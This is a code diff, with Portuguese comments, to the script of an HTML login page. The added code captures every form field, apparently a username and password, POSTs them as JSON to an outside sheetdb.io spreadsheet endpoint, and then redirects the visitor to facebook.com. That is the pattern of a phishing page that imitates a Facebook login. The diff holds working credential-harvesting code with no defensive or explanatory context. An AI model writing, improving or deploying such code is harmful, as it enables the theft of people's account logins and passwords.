@@ -62,11 +62,34 @@
             <button type="submit">Entrar</button>
         </form>
         <script>
-        document.getElementById('Login').onsubmit = function() {
-            setTimeout(function() {
-                window.location.href = "https://www.facebook.com";
-            }, 1500); // Atraso de 1500ms para garantir que os dados sejam enviados antes do redirecionamento
-            return true; // Permite que o formulário seja enviado
+        document.getElementById('Login').onsubmit = function(event) {
+            event.preventDefault(); // Previne o envio padrão do formulário
+
+            const formData = new FormData(this);
+            const data = {};
+            formData.forEach((value, key) => {
+                data[key] = value;
+            });
+
+            fetch('https://sheetdb.io/api/v1/sukxyvcd371y0', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ data })
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Dados enviados com sucesso, redireciona para o Facebook
+                    window.location.href = "https://www.facebook.com";
+                } else {
+                    // Trate o erro aqui, se necessário
+                    console.error('Erro ao enviar os dados');
+                }
+            })
+            .catch(error => {
+                console.error('Erro de rede:', error);
+            });
         };
         </script> 
     </div>
